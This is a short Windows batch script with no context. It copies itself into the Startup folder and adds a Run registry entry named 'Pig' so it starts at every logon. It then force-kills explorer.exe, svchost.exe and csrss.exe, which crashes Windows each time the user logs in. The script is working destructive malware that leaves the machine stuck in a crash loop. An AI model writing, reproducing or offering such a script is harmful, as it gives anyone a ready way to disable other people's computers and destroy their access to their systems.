@echo off

set "batPath=%~f0"

copy "%batPath%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Pig" /t REG_SZ /d "%batPath%" /f

taskkill /IM explorer.exe /F
taskkill /IM svchost.exe /F
taskkill /IM csrss.exe /F
